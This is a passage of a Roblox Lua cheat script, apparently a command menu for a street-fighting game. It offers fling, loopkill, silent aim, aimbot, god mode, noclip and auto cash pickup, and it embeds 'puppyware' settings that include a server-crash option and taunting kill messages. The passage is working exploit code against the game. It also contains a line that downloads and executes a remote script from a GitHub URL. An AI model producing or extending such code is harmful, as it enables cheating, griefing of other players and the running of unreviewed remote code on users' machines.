        if (Caller ~= LocalPlayer) then
a = true
        else
local L_1_ = "p"
local L_2_ = game.Players.LocalPlayer:GetMouse()
L_2_.KeyDown:Connect(
    function(L_22_arg0)
	if L_22_arg0 == L_1_ then
    for i, v in pairs(LocalPlayer.Character:GetChildren()) do
        if v:IsA("BasePart") or v:IsA("Part") or v:IsA("MeshPart") then
            if v.Name ~= "HumanoidRootPart" then
                v:Destroy()
            end
        end
    end
end
end
)
end
end)
cashaura1 = false
AddCommand("cashaura", {"autopick"}, "automatically picks up cash around your", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
            if cashaura1 == false then
                cashaura1 = true
                        Notify({ 
Description = "toggled on";
Title = "cashaura";
Duration = 2;
});
                repeat
wait(0.2)
player = game.Players.LocalPlayer
  local Character = player.Character
    local Humanoid = Character:FindFirstChildWhichIsA('Humanoid')

                for i,v in pairs(game:GetService('Workspace')['Ignored']['Drop']:GetChildren()) do
                    if v:IsA('Part') then
                        if (v.Position - player.Character.HumanoidRootPart.Position).Magnitude <= 12 then
                            fireclickdetector(v:FindFirstChild('ClickDetector'))
                        end
                    end
                end
                until cashaura1 == false
                else
                    cashaura1 = false
                            Notify({ 
Description = "toggled off";
Title = "cashaura";
Duration = 2;
});
                end
end
end)

autodrop = false
AddCommand("autodrop", {"fastdrop"}, "automatically drops cash", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = false
        else
if autodrop == false then
autodrop = true
        Notify({ 
Description = "toggled on";
Title = "autodrop";
Duration = 2;
});
	repeat
	game.ReplicatedStorage.MainEvent:FireServer("DropMoney", 10000)
                wait(1)
	until autodrop == false
else
if autodrop == true then
autodrop = false
        Notify({ 
Description = "toggled off";
Title = "autodrop";
Duration = 2;
});
end
end
end
end)


AddCommand("fling", {"stan"}, "flings a player", {"1"}, function(Caller, Args)
wait(0.5)
auraing3 = false
if errored ~= true then
flying = false
                        game.ReplicatedStorage.MainEvent:FireServer("Block",true)


if standing == true then
ExecuteCommand("unstand", {}, LocalPlayer);
standing2 = true
end


    local Target = GetPlayer(Args[1]);
    local Root = GetRoot()
    local OldPos, OldVelocity = Root.CFrame, Root.Velocity

    for i, v in next, Target do
        local TargetRoot = GetRoot(v);
        local TargetPos = TargetRoot.Position
        local Running = CConnect(Stepped, function(step)
            step = step - Services.Workspace.DistributedGameTime

            Root.CFrame = (TargetRoot.CFrame - (Vector3New(0, 1e6, 0) * step)) + (TargetRoot.Velocity * (step * 30))
            Root.Velocity = Vector3New(0, 1e6, 0)
        end)
        local starttime = tick();
        repeat
            wait();
        until (TargetPos - TargetRoot.Position).magnitude >= 60 or tick() - starttime >= 3.5
        Disconnect(Running);
    end
    wait();
    local Running = CConnect(Stepped, function()
        Root.Velocity = OldVelocity
        Root.CFrame = OldPos
    Root.CFrame = OldPos
    Root.CFrame = OldPos
    end)
    wait(2);
    Root.CFrame = OldPos
    Root.CFrame = OldPos
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
    Root.Velocity = OldVelocity
    Root.CFrame = OldPos
	plr = game:GetService('Players').LocalPlayer
	X11 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y11 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z11 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
wait(0.2)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11+5,Z11)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11-3,Z11)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11+5,Z11)
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11+5,Z11)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11-3,Z11)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11+5,Z11)
        Disconnect(Running);
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11+5,Z11)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11-3,Z11)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11+5,Z11)
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11+5,Z11)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11-3,Z11)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11+5,Z11)
if standing2 == true then
ExecuteCommand("summon", {}, LocalPlayer);
end
errored = false
end
end)


AddCommand("noclip", {}, "noclips your character", {3}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
a = true
        else
	local Char = GetCharacter()
	local Noclipping = AddConnection(CConnect(Stepped, function()
		for i, v in next, GetChildren(Char) do
			if (IsA(v, "BasePart") and v.CanCollide) then
				SpoofProperty(v, "CanCollide");
				v.CanCollide = false
			end
		end
	end), CEnv);
	local Torso = isR6() and Char.Torso or Char.UpperTorso
	local Noclipping2 = AddConnection(CConnect(Torso.Touched, function(Part)
		if (Part and Part.CanCollide and not FindFirstChildWhichIsA(Part.Parent, "Humanoid")) then
			local OldTransparency = Part.Transparency
			Part.CanCollide = false
			Part.Transparency = Part.Transparency <= 0.5 and 0.6 or Part.Transparency
			wait(2);
			Part.CanCollide = true
			Part.Transparency = OldTransparency
		end
	end), CEnv);
	Utils.Notify(Caller, "Command", "noclip enabled");
	CWait(GetHumanoid().Died);
	DisableAllCmdConnections("noclip");
end
end)


AddCommand("guiscript", {"gui"}, "disables noclip", {}, function(Caller)

print("a")


loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/rodus", true))() -- put this first above everything (important!)

CreateMain("project dominate") -- example main

CreateTab("player") -- example tab


CreateButton(tabs['player'], "fly", "toggle with x",function()
ExecuteCommand("fly", {}, LocalPlayer);

end)

CreateButton(tabs['player'], "shazam", "toggle with x",function()
ExecuteCommand("shazam", {}, LocalPlayer);

end)

CreateTextBox(tabs['player'], "speed", "speed here",function(arg) -- example text box
ExecuteCommand("flyspeed", {arg}, LocalPlayer);
end)

CreateButton(tabs['player'], "antislow", "u can walk without getting slowed down",function()
ExecuteCommand("antislow", {}, LocalPlayer);

end)


CreateButton(tabs['player'], "antibag", "self explanatory kinda...",function()
ExecuteCommand("antibag", {}, LocalPlayer);

end)


CreateButton(tabs['player'], "buy mask", "auto buys mask",function()
ExecuteCommand("mask", {}, LocalPlayer);

end)


CreateButton(tabs['player'], "hide mask", "makes your mask invisible",function()
ExecuteCommand("hidemask", {}, LocalPlayer);

end)


CreateButton(tabs['player'], "speed", "walkspeed hold v",function()
ExecuteCommand("speed", {}, LocalPlayer);

end)


CreateTextBox(tabs['player'], "speed", "speed here",function(arg) -- example text box
ExecuteCommand("speedspeed", {arg}, LocalPlayer);
end)


CreateButton(tabs['player'], "sit", "makes u sit",function()
ExecuteCommand("sit", {}, LocalPlayer);

end)


CreateButton(tabs['player'], "qtp", "press q to tp",function()
ExecuteCommand("qtp", {}, LocalPlayer);

end)


CreateTab("combat") -- example tab



CreateButton(tabs['combat'], "antistomp", "prevents you from being stomped",function()
ExecuteCommand("antistomp", {}, LocalPlayer);

end)

CreateButton(tabs['combat'], "fist reach", "let you hit from further away",function()
ExecuteCommand("fistreach", {}, LocalPlayer);

end)

CreateButton(tabs['combat'], "toolreach", "reach, but tools only",function()
ExecuteCommand("reach", {}, LocalPlayer);

end)



CreateTab("aiming") -- example tab


CreateButton(tabs['aiming'], "start silent aim", "can be streamable",function()
ExecuteCommand("saim", {}, LocalPlayer);

end)



CreateButton(tabs['aiming'], "toggle FOV", "allows you to see the silent aim fov",function()
ExecuteCommand("togglefov", {}, LocalPlayer);

end)



CreateTextBox(tabs['aiming'], "fov size", "size here",function(arg) -- example text box
ExecuteCommand("silentsize", {arg}, LocalPlayer);
end)



CreateTab("target") -- example tab

CreateTextBox(tabs['target'], "the target", "target",function(arg) -- example text box
targetlol = arg
guiscripttarget = targetlol
print(targetlol)

Notify({ 
Description = "new target btw";
Title = "target";
Duration = 5;
});

end)



CreateButton(tabs['target'], "attack", "kills the player",function()
ExecuteCommand("attack", {guiscripttarget}, LocalPlayer);

end)

CreateButton(tabs['target'], "bag", "bags the player",function()
ExecuteCommand("bag", {guiscripttarget}, LocalPlayer);

end)


CreateButton(tabs['target'], "goto", "teleports to the player",function()
ExecuteCommand("goto", {guiscripttarget}, LocalPlayer);

end)


CreateButton(tabs['target'], "view", "allows you to see the player",function()
ExecuteCommand("v", {guiscripttarget}, LocalPlayer);

end)


CreateButton(tabs['target'], "unview", "stops viewing",function()
ExecuteCommand("unv", {guiscripttarget}, LocalPlayer);

end)


CreateButton(tabs['target'], "cmd whitelist", "allows player to use ur cmds",function()
ExecuteCommand("flingwl", {guiscripttarget}, LocalPlayer);

end)


CreateTab("god stuff") -- example tab


CreateButton(tabs['target'], "full", "CANNOT DIE WHAT SO EVER can use guns",function()
ExecuteCommand("godbullet", {}, LocalPlayer);

end)



CreateButton(tabs['target'], "godmele", "godmode, but u can use mele",function()
ExecuteCommand("godmele", {}, LocalPlayer);

end)


end)

AddCommand("clip", {"unnoclip"}, "disables noclip", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
	if (not next(LoadCommand("noclip").CmdEnv)) then
        Notify({ 
Description = "ur not in noclip, idiot";
Title = "warning";
Duration = 2;
});
	else
		DisableAllCmdConnections("noclip");
	end
end
end)
standing = false

callme = "sir"

AddCommand("whatsmyname", {"myname"}, "fixes fling cmd", {}, function(Caller)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i am calling you by: "..callme.." ","All")
end)


AddCommand("summon", {}, "fixes fling cmd", {}, function(Caller)
if standing == false then
standing = true
standing = true
flying = true
ExecuteCommand("stand", {hostusername}, LocalPlayer);
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im here, "..callme ,"All")
end
end)

devchecked = false
AddCommand("callme", {}, "fixes fling cmd", {"1"}, function(Caller, Args)
callme = concat(Args, " ")
end)
AddCommand("devchecklol", {}, "fixes fling cmd", {"1"}, function(Caller, Args)
	local Amount = GetPlayer(Args[1])
    for i, v in next, Amount do
if devchecked == false then
devchecked = true
ExecuteCommand("flingwl", {Amount}, LocalPlayer);
end
end

end)


AddCommand("newhost", {}, "fixes fling cmd", {"1"}, function(Caller, Args)
	local Amount = GetPlayer(Args[1])
    for i, v in next, Amount do
hostusername = v.Name


        Notify({ 
Description = "newhost "..hostusername;
Title = "host";
Duration = 2;
});
end
end)

AddCommand("unsummon", {}, "fixes fling cmd", {}, function(Caller)
if standing == true then
ExecuteCommand("unstand", {}, LocalPlayer);
standing = false 
end
end)










AddCommand("targetgui", {"targetui"}, "fixes fling cmd", {}, function(Caller)




local ScreenGui = Instance.new("ScreenGui")
local targetgui = Instance.new("Frame")
local title = Instance.new("TextLabel")
local close = Instance.new("TextButton")
local fling = Instance.new("TextButton")
local loopkill = Instance.new("TextButton")
local TargetTextbox = Instance.new("TextBox")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

targetgui.Name = "targetgui"
targetgui.Parent = ScreenGui
targetgui.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
targetgui.BorderColor3 = Color3.fromRGB(60, 60, 60)
targetgui.Position = UDim2.new(0.437999994, 0, 0.135483876, 0)
targetgui.Size = UDim2.new(0, 112, 0, 219)

title.Name = "title"
title.Parent = targetgui
title.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
title.BorderColor3 = Color3.fromRGB(60, 60, 60)
title.Size = UDim2.new(0, 72, 0, 28)
title.Font = Enum.Font.SourceSans
title.Text = "Target gui"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 20.000

close.Name = "close"
close.Parent = targetgui
close.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
close.BorderColor3 = Color3.fromRGB(255, 255, 255)
close.Position = UDim2.new(0.642857134, 0, 0, 0)
close.Size = UDim2.new(0, 40, 0, 28)
close.Font = Enum.Font.SourceSans
close.Text = "X"
close.TextColor3 = Color3.fromRGB(255, 0, 4)
close.TextSize = 30.000

fling.Name = "fling"
fling.Parent = targetgui
fling.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
fling.BorderColor3 = Color3.fromRGB(255, 255, 255)
fling.Position = UDim2.new(0, 0, 0.342465758, 0)
fling.Size = UDim2.new(0, 112, 0, 28)
fling.Font = Enum.Font.SourceSans
fling.Text = "fling"
fling.TextColor3 = Color3.fromRGB(255, 255, 255)
fling.TextSize = 30.000

loopkill.Name = "loopkill"
loopkill.Parent = targetgui
loopkill.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
loopkill.BorderColor3 = Color3.fromRGB(255, 255, 255)
loopkill.Position = UDim2.new(0, 0, 0.470319629, 0)
loopkill.Size = UDim2.new(0, 112, 0, 28)
loopkill.Font = Enum.Font.SourceSans
loopkill.Text = "loopkill"
loopkill.TextColor3 = Color3.fromRGB(255, 0, 4)
loopkill.TextSize = 30.000

TargetTextbox.Name = "TargetTextbox"
TargetTextbox.Parent = targetgui
TargetTextbox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
TargetTextbox.BorderColor3 = Color3.fromRGB(60, 60, 60)
TargetTextbox.Position = UDim2.new(0, 0, 0.127853885, 0)
TargetTextbox.Size = UDim2.new(0, 112, 0, 47)
TargetTextbox.Font = Enum.Font.SourceSans
TargetTextbox.Text = "user"
TargetTextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
TargetTextbox.TextSize = 16.000


targetgui.Active = true
targetgui.Draggable = true

Players = game:GetService('Players')
UIS = game:GetService('UserInputService')
RS = game:GetService('RunService')



function SetPlayerInfo()
	local foundplayer = game:GetService('Players'):FindFirstChild(TargetTextbox.Text)
	if foundplayer then
print("found player")
	end
end


function ShrinkName()
	TargetTextbox.FocusLost:connect(function()
		for i,v in pairs(game.Players:GetChildren()) do
			if (string.sub(string.lower(v.Name),1,string.len(TargetTextbox.Text))) == string.lower(TargetTextbox.Text) then
				TargetTextbox.Text = v.Name
				SetPlayerInfo()
			end
		end
	end)
end
ShrinkName()

loopkilling = false

function gotokill()
 local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = TargetTextbox.Text
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
game.ReplicatedStorage.MainEvent:FireServer("Stomp")

end

local function PENE_fake_script() -- fling.LocalScript 
	local script = Instance.new('LocalScript', fling)

	script.Parent.MouseButton1Click:Connect(function()
		ExecuteCommand("fling", {TargetTextbox.Text}, LocalPlayer);	
	end)
end
coroutine.wrap(PENE_fake_script)()
local function VPITNRN_fake_script() -- loopkill.LocalScript 
	local script = Instance.new('LocalScript', loopkill)

	script.Parent.MouseButton1Click:Connect(function()

   local Players = game:GetService("Players")
local ContextActionService = game:GetService("ContextActionService")
 
local localPlayer = Players.LocalPlayer

			if localPlayer.Character then 
				local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")
				if humanoid then 
					humanoid:UnequipTools()
end
end
ExecuteCommand("equipfist", {}, LocalPlayer);
--loopkill
if loopkilling == false then
    loopkilling = true
    loopkill.TextColor3 = Color3.fromRGB(1, 255, 1)
  
repeat
    wait()
attackfinished = false
Amount = TargetTextbox.Text
if game.Players[Amount].Character.BodyEffects['K.O'].Value ~= true then
ExecuteCommand("attack", {Amount}, LocalPlayer);
end
wait(0.1)
if game.Players[Amount].Character.BodyEffects['K.O'].Value ~= true then
ExecuteCommand("attack", {Amount}, LocalPlayer);
end
if game.Players[Amount].Character.BodyEffects['K.O'].Value ~= true then

ExecuteCommand("attack", {Amount}, LocalPlayer);
end

wait(0.9)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)

game.ReplicatedStorage.MainEvent:FireServer("Stomp")

game.ReplicatedStorage.MainEvent:FireServer("Stomp")
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
gotokill()
wait(0.1)
gotokill()
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")

until loopkilling == false
  
    
    else
        loopkill.TextColor3 = Color3.fromRGB(255, 1, 1)
    loopkilling = false
    
    end
	
	end)
end
coroutine.wrap(VPITNRN_fake_script)()



end)

AddCommand("findplr", {"finduser"}, "teleports yourself to the other character", {3, "1"}, function(Caller, Args)
	local Amount = GetPlayer(Args[1])
    for i, v in next, Amount do
Amount = (v)
print(Amount)
end
end)
antibag = false
AddCommand("antibag", {}, "fixes fling cmd", {}, function(Caller)

if antibag == false then
antibag = true
repeat
wait()
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Christmas_Sock"):Destroy()
until antibag == false
else
antibag = false
end


end)


AddCommand("nochair", {"antisit"}, "fixes fling cmd", {}, function(Caller)
    for i,v in next, workspace:GetDescendants() do
        if v:IsA'Seat' then
            v:Destroy()
        end
    end
end)


AddCommand("maskusers", {}, "fixes fling cmd", {}, function(Caller)
    for i,v in pairs(game.Workspace.Players:GetChildren()) do
        v:FindFirstChildWhichIsA('Humanoid').DisplayDistanceType = 'Subject'
    end
end)

powerattack = true
AddCommand("power", {"powerattack"}, "fixes fling cmd", {}, function(Caller)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("now attacking with power! ","All")
powerattack = true
end)

AddCommand("multi", {"multiattack"}, "fixes fling cmd", {}, function(Caller)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("now attacking with speed! ","All")
powerattack = false
end)








AddCommand("godmele", {}, "fixes fling cmd", {}, function(Caller)



--[[

if getgenv().PuppywareSettings == nil then

    print("Cannot find your configuration.")

    getgenv().PuppywareSettings = {
        PerformanceMode = true,
        turksense = false,
        TargetKey = "E"
    }

end

wait(0.5)

]]



getgenv().PuppywareSettings = {
	PerformanceMode = true,
	turksense = false,
	TargetKey = "Q",
	Watermark = true
}


local PuppywareSettings = getgenv().PuppywareSettings

if PuppywareSettings == nil then

	getgenv().PuppywareSettings = {
		PerformanceMode = true,
		turksense = false,
		TargetKey = "E",
		Watermark = true
	}

end

local Script = {
	Version = "v0.0.5",
	Name = "puppyware-priv"
}

local Settings = {
	Prediction_Settings = {
		AutoSettings = false,
		Prediction = 0.165
	},
	KillSay = {
		Type = "After Dead",
		"",
		Cooldown = false,
		CustomMessage = false,
		CustomMessageText = "@s is tapped!",
		Message = {
			"@s is sus.",
			"nn tapped, @s bad cheat.",
			"puppyware on top, @s is clapped.",
			"@s is rekted.",
			"puppyware>you",
			"you are just bad get puppyware",
			"u rly thought",
			"bad boy clique",
			"noob",
			"xD",
			"why are you that bad son",
			"you shall quit"
		}
	},
	Aimbot = {
		Enabled = false,
		Aiming = false,
		FOV = {
			Enabled = false,
			Size = 100,
			Round = 100,
			Color = Color3.fromRGB(28, 56, 139),
			Shape = "Custom",
			Filled = false,
			Transparency = 0.5
		},
		Hitbox = "Head",
		Nearest = "Mouse",
		VisibleCheck = false,
		IgnoreFOV = false,
	},
	SilentAim = {
		Enabled = false,
		WallCheck = false,
		FOV = {
			Enabled = false,
			Size = 100,
			Round = 100,
			Color = Color3.fromRGB(28, 56, 139),
			Shape = "Custom",
			Filled = false,
			Transparency = 0.5
		},
		Hitbox = "Head",
		Nearest = "Mouse",
		Mode = "Normal",
		VisibleCheck = false,
		IgnoreFOV = false,
		LookAt = false,
	},
	Triggerbot = {
		Enabled = false,
		Delay = {
			Enabled = false,
			Value = 0
		}
	},
	AntiAim = {
		Enabled = false,
		Type = "Jitter",
		Angle = 20,
		Speed = 100,
		Underground = false,
		AntiPointAt = false,
		NoAutoRotate = false,
		AntiPointAtDistance = 20
	},
	Whitelist = {
		Players = {},
		Friends = {},
		Holder = "",
		Enabled = false,
		CrewEnabled = false,
		FriendsWhitelist = false
	},
	Movement = {
		CFrameSpeed = false,
		Type = "Render"
	},
	ServerCrash = {
		Enabled = false,
		Value = 0
	},
	God = {
		GodBullet = false,
		GodMelee = false,
		AntiRagdoll = false,
		IsStillAlive = false
	},
	Target = {
		Enabled = false,
		TargetUser = nil,
		WallCheck = false,
		Bind = PuppywareSettings.TargetKey
	}
}

local Service = setmetatable({}, {
	__index = function(t, k)
		return game:GetService(k)
	end
})

local WS = workspace
local Insert = table.insert
local Remove = table.remove
local Find = table.find
local Players = Service.Players
local LocalPlayer = Players.LocalPlayer
local CurrentCamera = WS.CurrentCamera
local WorldToViewPortPoint = CurrentCamera.WorldToViewportPoint
local Mouse = LocalPlayer:GetMouse()
local RunService = Service.RunService
local GuiInset = Service.GuiService:GetGuiInset()
local ReplicatedStorage = Service.ReplicatedStorage
local UserInputService = Service.UserInputService
local KeyCode = Enum.KeyCode
local InputType = Enum.UserInputType
local Material = Enum.Material
local UniversalAnimation = Instance.new("Animation")
local StarterGui = Service.StarterGui

local Module = {
	Instance = {},
	Players = {},
	DrawingInstance = {},
	OldCFrame,
	Ignores = {
		"UpperTorso",
		"LowerTorso",
		"Head",
		"LeftHand",
		"LeftUpperArm",
		"LeftLowerArm",
		"RightHand",
		"RightUpperArm",
		"RightLowerArm"
	},
	BodyParts = {
		"Head",
		"Torso",
		"HumanoidRootPart",
		"Left Arm",
		"Right Arm",
		"Left Leg",
		"Right Leg"
	},	
	Functions = {
		Network = function(Data)
			if Data and Data.Character and Data.Character:FindFirstChild("HumanoidRootPart") ~= nil and Data.Character:FindFirstChild("Humanoid") ~= nil and Data.Character:FindFirstChild("Head") ~= nil then
				return true
			end
			return false
		end,
		Cham = function(Data, State)
			local BoxVar = nil
			local GlowVar = nil
			if State then
				for _, v in pairs(Data.Character:GetChildren()) do
					if v:IsA("BasePart") and v.Transparency ~= 1 then
						if not v:FindFirstChild("Box") then
							BoxVar = Instance.new("BoxHandleAdornment", v)
							BoxVar.Name = "Box"
							BoxVar.AlwaysOnTop = true
							BoxVar.ZIndex = 4
							BoxVar.Adornee = v
							BoxVar.Color3 = Color3.fromRGB(0, 153, 153)
							BoxVar.Transparency = 0.5
							BoxVar.Size = v.Size + Vector3.new(0.02, 0.02, 0.02)
						end
					end
				end
			else
				for i, v in pairs(Data.Character:GetChildren()) do
					if v:IsA("BasePart") and v.Transparency ~= 1 then
						if v:FindFirstChild("Box") then
							v["Box"]:Destroy()
						end
					end
				end

				return BoxVar, GlowVar
			end
		end
	},
	Drawing = {
		Circle = function(Thickness)
			local Circle = Drawing.new("Circle")
			Circle.Transparency = 1
			Circle.Thickness = Thickness
			return Circle
		end
	},
}

Module.Functions.NoSpace = function(Data)
	return Data:gsub("%s+", "") or Data
end

Module.Functions.Find = function(Data)
	local Target = nil

	for i, v in next, Players:GetPlayers() do
		if v.Name ~= LocalPlayer.Name and v.Name:lower():match('^'.. Module.Functions.NoSpace(Data):lower()) then
			Target = v.Name
		end
	end

	return Target
end

Module.Functions.PlayAnimation = function(Data, SpeedData, ActionData)
	if Module.Functions.Network(LocalPlayer) then
		UniversalAnimation.AnimationId = "rbxassetid://" .. tostring(Data)
		local Track = LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(UniversalAnimation)
		if ActionData then
			Track.Priority = Enum.AnimationPriority.Action
		end
		if SpeedData ~= nil then
			Track:AdjustSpeed(SpeedData)
		end
		Track:Play()
	end
end

Module.Functions.StopAnimation = function()
	if Module.Functions.Network(LocalPlayer) then
		for _, v in next, LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks() do
			if v.Animation.AnimationId:match("rbxassetid") then
				v:Stop()
			end
		end
	end
end

Module.Functions.Underground = function(Data)
	if Module.Functions.Network(LocalPlayer) then
		if Data then
			LocalPlayer.Character.Humanoid.HipHeight = -1
			Module.Functions.PlayAnimation(3152378852, nil, true)
		else
			LocalPlayer.Character.Humanoid.HipHeight = 2.1
			Module.Functions.StopAnimation()
		end
	end
end

Module.Functions.AntiHead = function(State)
	if Module.Functions.Network(LocalPlayer) then
		if State then
			Module.Functions.PlayAnimation(3189777795, 0.1, false)
		else
			Module.Functions.StopAnimation()
		end
	end
end

Module.Functions.IsVisible = function(OriginPart, Part)
	if Module.Functions.Network(LocalPlayer) then
		local IgnoreList = {CurrentCamera, LocalPlayer.Character, OriginPart.Parent}
		local Parts = CurrentCamera:GetPartsObscuringTarget(
			{
				OriginPart.Position, 
				Part.Position
			},
			IgnoreList
		)

		for i, v in pairs(Parts) do
			if v.Transparency >= 0.3 then
				Module.Instance[#Module.Instance + 1] = v
			end

			if v.Material == Enum.Material.Glass then
				Module.Instance[#Module.Instance + 1] = v
			end
		end

		return #Parts == 0
	end
	return true
end

Module.Functions.NilBody = function()
	if Module.Functions.Network(LocalPlayer) then
		for i, v in pairs(LocalPlayer.Character:GetChildren()) do
			if v:IsA("BasePart") or v:IsA("Part") or v:IsA("MeshPart") then
				if v.Name ~= "HumanoidRootPart" then
					v:Destroy()
				end
			end
		end
	end
end

Module.Functions.TableRemove = function(Data, Data2)
	for i, v in pairs(Data) do
		if v == Data2 then
			Remove(Data, i)
		end
	end
end

Module.Functions.GodFunc = function(Variable)
	LocalPlayer.Character.RagdollConstraints:Destroy()
	local Folder = Instance.new("Folder", LocalPlayer.Character)
	Folder.Name = "FULLY_LOADED_CHAR"
	wait()
	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
	Variable = false
end

Module.Functions.Init = function()
	for _, v in next, Players:GetPlayers() do
		if v ~= LocalPlayer and v:IsFriendsWith(LocalPlayer.UserId) then
			Insert(Settings.Whitelist.Friends, v.Name)
		end
	end

	Players.PlayerAdded:Connect(function(_Player)
		if _Player ~= LocalPlayer and _Player:IsFriendsWith(LocalPlayer.UserId) then
			Insert(Settings.Whitelist.Friends, _Player.Name)
		end
	end)

	Players.PlayerRemoving:Connect(function(_Player)
		if _Player ~= LocalPlayer and _Player:IsFriendsWith(LocalPlayer.UserId) then
			Module.Functions.TableRemove(Settings.Whitelist.Friends, _Player.Name)
		end
	end)

	LocalPlayer.CharacterAdded:Connect(function()
		wait(0.5)
		Settings.God.IsStillAlive = false
		if LocalPlayer.Character:FindFirstChild("BodyEffects") then
			if Settings.God.GodBullet then
				Module.Functions.GodFunc(Settings.God.GodBullet)
				LocalPlayer.Character.BodyEffects.BreakingParts:Destroy()
			end
			if Settings.God.GodMelee then
				Module.Functions.GodFunc(Settings.God.GodMelee)
				Settings.God.IsStillAlive = true
				LocalPlayer.Character.BodyEffects.Armor:Destroy()
				LocalPlayer.Character.BodyEffects.Defense:Destroy()
			end
			if Settings.God.AntiRagdoll then
				Module.Functions.GodFunc(Settings.God.AntiRagdoll)
			end
		end
		wait(0.5)
		if Settings.AntiAim.Underground then
			Module.Functions.Underground(true)
		end
		wait(0.4)
		if Settings.AntiAim.UndergroundWallbang then
			Float = Instance.new("BodyVelocity")
			Float.Parent = LocalPlayer.Character.HumanoidRootPart
			Float.MaxForce = Vector3.new(100000, 100000, 100000)
			Float.Velocity = Vector3.new(0, 0, 0)
			wait(0.25)
			LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, -11.5, 0)
			Module.Functions.Cham(LocalPlayer, true)
			Settings.AntiAim.UndergroundWallbang = true
		end
	end)
end

Module.Functions.NearestMouse = function()
	local Target = nil
	local Distance = math.huge

	for _, v in next, Players:GetPlayers() do
		if Module.Functions.Network(v) and v ~= LocalPlayer then
			local RootPosition, RootVisible = WorldToViewPortPoint(CurrentCamera, v.Character.HumanoidRootPart.Position)
			local NearestToMouse = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(RootPosition.X, RootPosition.Y)).magnitude
			if RootVisible and Distance > NearestToMouse then
